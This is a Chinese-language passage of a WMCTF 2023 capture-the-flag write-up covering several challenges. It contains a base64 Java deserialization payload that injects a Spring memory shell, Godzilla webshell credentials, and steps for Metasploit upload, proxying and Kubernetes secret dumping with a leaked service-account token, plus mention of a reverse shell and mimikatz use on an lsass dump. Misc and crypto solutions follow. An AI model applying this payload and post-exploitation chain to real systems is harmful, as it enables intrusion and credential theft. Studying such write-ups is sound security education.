FqMk11UEk3bnN1cyt2QzJEZDk2RHA0TDllSzlBbFNmSXNQWGpIbm55b1NwdmFaSFhuY0ZIcXJ4Rm5vS1A5ZU9UTGp5QkJYSjlCcTZXMGd3K2s4RVhlbkd5eUp2QnFYNWszRGlPSThHQ3ZpSnZQL3JkdkFnY1lTSThWSldYNVQ2TEV4azhVcVVkeCtRcTN4bWNiU255OWVLeFI0dTBvcndNbnRqSnQxZSt5L3J4VFlGVFdPV2VNaVdENzJid295SXRneDg3KzZXUytCa1A3ZXJETDNpV3BaYkV2K0tHKzM3UC9mVCtJSTd4NnJuUGVYYzY4ZHFtNnF1VzhhbkRZa2Fta3JGWnk3alVNeklkZkpxTXdVRkNld3hieU5XRXU3RVo5M0pxM1VmT0Uyakd3OWlPeDNBdG51RUg0d3NjR0M5aXQ0cDFHNnZ1R0hYRWtXRGwzczFmU2V4bmpSN2tieE1wNXNHOWxHU2ZMbVlNTEtTWmZKWEV1WXZ4bHpsMExwc1Q1OUNOQXlvbnpxRUhONnBVUHFja3VWVjJySVQzVlhSb09NU1FEMUNhcHFKL1dNUE5HbTYxdHpWZUtaZ0xkN3lDZk82OWpLYVhLZS9YTW4zNHJtTkdMR09oMkdYQWpGYzV1VlEwRlB5dUR5ODBsakd5MTduNU9KZkIzOC9ncFJaUFdRYi83c1YvSmNDdlpERFFRSmJHb0t3RkYzdERlYllXNXRBMzRBYnU2dlM4RmRNUTVybEJpZ2lydkUzaE5JKzBQdFpFUFg2ai9GcksvSitxU3JnQ3ozRWxsSWVGY0EyUWpWN3Q0cCtkMVRTV054ODdyVVVUQVpXZ0hSSU5oVUxyRS9tTlpZVmlvamdySm1kRVlSbmYwekppVmxNNVU3UlF6UFk4akJNdDdvSk56VHdyNTQ5Ylc5eWxYTTg2aTExMHBicXBVTXhWRW1SdWVvbzhpbWwrTGxPUlp4U1hsN1Z5VXZXOWRiU3RqcG5VeFZnTklyR00zUktxQm1NMHQ1TjdjZEoxOFR4Qnl2M1l4SnpZeXF6b1loYjBNQmNPTXVJU25ZMUVjRFk0bWxTczJiU0VFRkxIVml4U2V4NXlWamg3NjdGS3VKMStja2g0bUVVU3hZUENtMFd4UkhhUk90VVpCbEVjd0FyWlFkUnYxU3I0R0prYS9GWnlVTjd0b0h3MEYrWEx4MFo1c1FQWXJ0RW9iN0wvaUZvTnNTNGVoWFZwTHVzSXJJZDRoeENYMVZySE9yMkZTVDRjOFlNOFBVelRiK0xlemFRN1NzcGJTSGtiRVR5Q25iaWR2KzdrNmc3K3Z5c0g4Ukt4d0VGOG5ZUHVUZ1RWbm9lY2xjN2VOVmliUmZ3b0ViZno5ZzRpWHAyTGVMMlR0NXNjeEtzbDR1cjMySWo3UkRBN2g2OVdSUUVzN0JQbDV4dWtQSDVBVFdIcGU0RWFZNFcwYXlwN3lIeFcxd0lJVVNHdEU2SC9Bek5tdWs4UEZ3QUEMAGMAZAwAdQB2DACGAHYMAJAAkQcBKgwBKwEsDAEtAS4BADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIMAS8BMAEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzDAC5AK4BAApnZXRSZXF1ZXN0AQAKZ2V0U2Vzc2lvbgEAEWdldFNlcnZsZXRDb250ZXh0AQBCb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5zdXBwb3J0LldlYkFwcGxpY2F0aW9uQ29udGV4dFV0aWxzAQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAPamF2YS9sYW5nL0NsYXNzAQAcamF2YXguc2VydmxldC5TZXJ2bGV0Q29udGV4dAEAEGphdmEvbGFuZy9PYmplY3QMALkAvAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADFvcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5MaXZlQmVhbnNWaWV3DAExAHYMAK0ArgEAF2phdmEvdXRpbC9MaW5rZWRIYXNoU2V0DABxATIHATMMATQAdgEANW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQuV2ViQXBwbGljYXRpb25Db250ZXh0DAE1ATYMATcBOAwAXwBZDABgAFkMAJcAmAwAngCfAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwE5DAE6AIwMATsBPAcBKQwBPQE+DAE/AUAMAUEBQgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAdnZXRCZWFuAQAQamF2YS9sYW5nL1N0cmluZwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABNqYXZhL3V0aWwvQXJyYXlMaXN0DAFDAUQBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyDAFFATABAAxkZWNvZGVCdWZmZXIMAUYBPAEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtDABjAUcBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQwAYwFIDAFJAUoMAUsBTAwBTQFODACzALQHAU8MAVABUQwBUgFTAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFUATYMAGMBVQwBVgFXDAFYAFkMAVkBRAwBWgFbAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAVwAWQEAFmNvbS9leGFtcGxlL2V4cC9BdnhlcmIBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwEAEmphdmEvdXRpbC9JdGVyYXRvcgEABG5leHQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHZm9yTmFtZQEACWdldE1ldGhvZAEABShbQilWAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQALdG9CeXRlQXJyYXkBAAQoKVtCAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQASZ2V0RGVjbGFyZWRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAdnZXROYW1lAQAGZXF1YWxzAQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwEACmdldE1lc3NhZ2UAIQBWAFcAAAAAAA8AAQBYAFkAAQBaAAAALQABAAEAAAADEgGwAAAAAgBbAAAABgABAAAAGABcAAAADAABAAAAAwBdAF4AAAABAF8AWQABAFoAAA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"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
```

```python
加密器: JAVA_AES_BASE64
地址: /shellAacw125
密码: Hcreljak
密钥: Vazwoxyqvohfnbgcwq
请求头: Agent:aaa
```

后面要内网渗透

没法直接执行命令

用哥斯拉马上传 msf 马并给可执行权限

![](static/HVg7b8mTuo29CPxPYhFc6nItn3d.png)

执行上线 msf

![](static/Y0gUbcYhdorUcRxdZAFce8E3npt.png)

![](static/GSndbz0Dbo4RcexR8K6cyzNwnec.png)

然后同样的方法挂个 nps 代理，用 Proxifier 连上访问内网

从环境变量里能看出有 k8s 服务，还有个 CHECK_SERVICE

![](static/W4i5bp1FKo2MizxWBOEcSS1anOz.png)

题目源码有个内网地址

![](static/ECskbDQXboCbfOxv8vMcyQw0nrh.png)

viper 做端口转发

![](static/DgH9bKE2MoOQLex09qmcA8IGnsh.png)

从给的 jar 包里的 lib.so 里拿到 token

```sql
export KUBE="eyJhbGciOiJSUzI1NiIsImtpZCI6IlZvTVB3eDlfNm0wSzljbnhXRUNZU3JWa1VQRjY3Z05xaTRKU2xwUzBZNXcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImN0Zi1zZXJ2aWNlYWNjb3VudC1zZWNyZXQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiY3RmLXNlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjEwNWQ5ODctZmQ1Zi00MjZiLTgxODgtOWI3MWNjZTkwYmRhIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmLXNlcnZpY2VhY2NvdW50In0.DAaw3fHoGdY8Kl4BHnGeuQaAHJQpLdbB-jsatlLVfJM60N6Ftx0TyXlGDCsgm2e0u25xnWudQqZeneu1H1EaC0QQDzliPjG5dVhbXYIciM3dOyb8cap5wy5bPAgsAE1wPs_ZxAT6r7XQjWfYkqY6waI6R4_Hdrb98Vzwo4O6EYqNQAX8lVlGtAoIbkZ7U72z-zDR6rf_IHetdRs2JYpzG9kScbZLkWGHelY18dCXZHW_FfKqw1yh9zLUf8mh3PwXIeruUOp2oznVazT-qVnxaMOhLKF-4zqEXPbQVgoZh8mT6DNXj5GCBDex4_Uptj-dYJtMzSNC8qyenAeb3tg3Sg"
kubectl --token=$KUBE --server=https://xxx.xxx.xx.xxx:6443 --insecure-skip-tls-verify=true auth can-i --list -n default
```

![](static/XHg9brxAfoOSMYxQzjhcLT9SnDe.jpg)

```sql
kubectl --token=$KUBE --server=https://xxx.xxx.xx.xxx:6443 --insecure-skip-tls-verify=true get secrets -o yaml -n default
```

得到

```yaml
apiVersion: v1
items:
- apiVersion: v1
  data:
    password: NWU5ZDgxODktNWMxNi00NTg3LTkyNjAtNGU2YjBjODZmMWVi
    username: a2V5
  kind: Secret
  metadata:
    annotations:
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","data":{"password":"NWU5ZDgxODktNWMxNi00NTg3LTkyNjAtNGU2YjBjODZmMWVi","username":"a2V5"},"kind":"Secret","metadata":{"annotations":{},"name":"key-secret","namespace":"default"},"type":"Opaque"}
    creationTimestamp: "2023-08-18T19:01:04Z"
    managedFields:
    - apiVersion: v1
      fieldsType: FieldsV1
      fieldsV1:
        f:data:
          .: {}
          f:password: {}
          f:username: {}
        f:metadata:
          f:annotations:
            .: {}
            f:kubectl.kubernetes.io/last-applied-configuration: {}
        f:type: {}
      manager: kubectl-client-side-apply
      operation: Update
      time: "2023-08-18T19:01:04Z"
    name: key-secret
    namespace: default
    resourceVersion: "31990"
    uid: 41eca5bb-3afb-49cd-86ef-9b0e482929d2
  type: Opaque
- apiVersion: v1
  data:
    ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUyT1RJek5EWTFNamd3SGhjTk1qTXdPREU0TURneE5USTRXaGNOTXpNd09ERTFNRGd4TlRJNApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUyT1RJek5EWTFNamd3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTbWZBdCtJTDdTSEdTT0VCQjB6djBhZThhOHBZaVVRempQWG5HUWt6SXoKQnJvdmNTK0s4c1o2NjRwaExBR2IzMmdrV1RndzdVSlArL3IyUUJzekV5Q09vMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXMvZDRrbytkemtCV0h6cVdSY3FCCnhMMkVaaHd3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnTS91NHFIcU93Z2drenhuejV1cG80dnlJSzQvQTBDcWcKMGVoTGxKRUQwNG9DSVFDdXNLcGVncm5IKy9IeWxYSXVMV3liZGNXbjZZMTlXOXR2MXdSUktSNDBzdz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    namespace: ZGVmYXVsdA==
    token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklsWnZUVkIzZURsZk5tMHdTemxqYm5oWFJVTlpVM0pXYTFWUVJqWTNaMDV4YVRSS1UyeHdVekJaTlhjaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbU4wWmkxelpYSjJhV05sWVdOamIzVnVkQzF6WldOeVpYUWlMQ0pyZFdKbGNtNWxkR1Z6TG1sdkwzTmxjblpwWTJWaFkyTnZkVzUwTDNObGNuWnBZMlV0WVdOamIzVnVkQzV1WVcxbElqb2lZM1JtTFhObGNuWnBZMlZoWTJOdmRXNTBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpYSjJhV05sTFdGalkyOTFiblF1ZFdsa0lqb2lZakV3TldRNU9EY3RabVExWmkwME1qWmlMVGd4T0RndE9XSTNNV05qWlRrd1ltUmhJaXdpYzNWaUlqb2ljM2x6ZEdWdE9uTmxjblpwWTJWaFkyTnZkVzUwT21SbFptRjFiSFE2WTNSbUxYTmxjblpwWTJWaFkyTnZkVzUwSW4wLkRBYXczZkhvR2RZOEtsNEJIbkdldVFhQUhKUXBMZGJCLWpzYXRsTFZmSk02ME42RnR4MFR5WGxHRENzZ20yZTB1MjV4bld1ZFFxWmVuZXUxSDFFYUMwUVFEemxpUGpHNWRWaGJYWUljaU0zZE95YjhjYXA1d3k1YlBBZ3NBRTF3UHNfWnhBVDZyN1hRaldmWWtxWTZ3YUk2UjRfSGRyYjk4Vnp3bzRPNkVZcU5RQVg4bFZsR3RBb0lia1o3VTcyei16RFI2cmZfSUhldGRSczJKWXB6RzlrU2NiWkxrV0dIZWxZMThkQ1haSFdfRmZLcXcxeWg5ekxVZjhtaDNQd1hJZXJ1VU9wMm96blZhelQtcVZueGFNT2hMS0YtNHpxRVhQYlFWZ29aaDhtVDZETlhqNUdDQkRleDRfVXB0ai1kWUp0TXpTTkM4cXllbkFlYjN0ZzNTZw==
  kind: Secret
  metadata:
    annotations:
      kubernetes.io/service-account.name: ctf-serviceaccount
      kubernetes.io/service-account.uid: b105d987-fd5f-426b-8188-9b71cce90bda
    creationTimestamp: "2023-08-18T13:22:29Z"
    labels:
      kubernetes.io/legacy-token-last-used: "2023-08-20"
    managedFields:
    - apiVersion: v1
      fieldsType: FieldsV1
      fieldsV1:
        f:metadata:
          f:annotations:
            .: {}
            f:kubernetes.io/service-account.name: {}
        f:type: {}
      manager: kubectl-create
      operation: Update
      time: "2023-08-18T13:22:29Z"
    - apiVersion: v1
      fieldsType: FieldsV1
      fieldsV1:
        f:data:
          .: {}
          f:ca.crt: {}
          f:namespace: {}
          f:token: {}
        f:metadata:
          f:annotations:
            f:kubernetes.io/service-account.uid: {}
          f:labels:
            .: {}
            f:kubernetes.io/legacy-token-last-used: {}
      manager: k3s
      operation: Update
      time: "2023-08-20T06:36:29Z"
    name: ctf-serviceaccount-secret
    namespace: default
    resourceVersion: "140777"
    uid: bf517b49-e11d-42da-879c-df84513ce55d
  type: kubernetes.io/service-account-token
kind: List
metadata:
  resourceVersion: ""
  selfLink: ""
```

上面 password 进行 base64 解码得到 key `5e9d8189-5c16-4587-9260-4e6b0c86f1eb`

访问内网 check_service 执行命令

![](static/NY9WbdcKRohonMxYuVGcAtTRnFf.png)

反弹个 shell 然后执行 /readflag

![](static/ApFMb2PjwolBRdxZCf5cQ6DEn7e.png)

## Misc

### Checkin

WMCTF{Welcome_W&MCTF_2023!}

### Oversharing

smb2 协议里看到 lsass.dmp

![](static/CmNBbf0pYoCbIexoFldcZmv7nYg.png)

导出对象后用 mimikatz 分析

![](static/NAtwbmNIjondXcxESTZcZbP4nwc.png)

知道了 ssh 的密码

![](static/Cl6AbjPwEozseSxPfiBcDcjUn6e.png)

### Fantastic terminal

strings out.wasm

![](static/HGQTb9HXno01dhxkslNcHvXnnqf.png)

### Fantastic terminal  Rev

本地把 docker 搭起来，发现是一个浏览器的终端，在根目录有一个叫 challenge 的二进制文件，直接编码后提取出来

逆向分析

![](static/SBgWbzsZso1UjdxvReocckosnqM.png)

Exp:

```python
enc=[ 0x5,0x1F, 0x11, 0x06, 0x14, 0x29, 0x20, 0x61]
enc2="$7<57\r&7 ?c<3>\r34&7 \r4'19c<5\r\"33&1:::::::::::::/"
for i in enc:
    print(chr((i)^0x52),end='')
for i in enc2:
    print(chr(ord(i)^0x52),end='')
```

### Find me

Reddit:

```
l recently designed a new encryption method, and l don't think  anyone can decrypt it. If you don't believe me, you can try it out😎😎😎   
        
---> aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA== 

https://wearymeadow.icu/2023/07/31/My-secret-encryption-algorithm/  
需要一个文章解锁密码， hexo-blog-encrypt
```

在别的仓库 [https://github.com/WearyMeadow/autologinbot/blob/80504fccdd7e75992eb8a4b61efb73a6e26a480c/login.py](https://github.com/WearyMeadow/autologinbot/blob/80504fccdd7e75992eb8a4b61efb73a6e26a480c/login.py) 找到密码: P@sSW0rD123$%^

```sql
import random
from string import printable
from Crypto.Cipher import AES

key = bytes([int(i, 16) for i in "6d 79 73 65 63 72 65 74 6b 65 79 00 00 00 00 00".split()])
a = bytes.fromhex("778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2")

cipher = AES.new(key, AES.MODE_ECB)
encrypted = cipher.decrypt(a).strip(b"\x00")
# print(encrypted)
for i in range(11451):
    random.seed(i)
    test = b''
    for _ in encrypted:
        test += bytes([_ ^ random.randint(0, 255)])
    try:
        test = test.decode()
        if all([i in printable for i in test]):
            print(test)
    except:
        pass
```

## Crypto

### signin

剪枝

```python
n = 80987176687576724458921196768479688588358815091237835200934002013473006212161736452274437658331264315002405559770035137142164429704589683541314527560746749334663091480718039129686603221263877966179623363941068525408625096028702476412999153128482796108779967595557510859434595374638909704925098725993600723411
gift = 108294291878772197168368132519440677698031894567345831892723029914962767703931804018498479183709920483150186803032990399090972083441399971542637277276

os = 16

def guess(p,q,time):
    #print(p,q)
    if time == 512:
        if int(p,2)*int(q,2) == n:
            print(int(p,2),int(q,2))
        return 0
    if time > 0:
        if int(p,2)*int(q,2)%2**time != n%2**time:
                return 0
        if time <= os:
            1
        elif time <= 512-os:
            #print(p,q[:-16])
            if (int(p,2)%2**(time-os))^int(q[:-os],2)%2**(time-os) != gift%2**(time-os):
                return 0
    pos_p = ['1'+p,'0'+p]
    pos_q = ['1'+q,'0'+q]
    for p in pos_p:
        for q in pos_q:
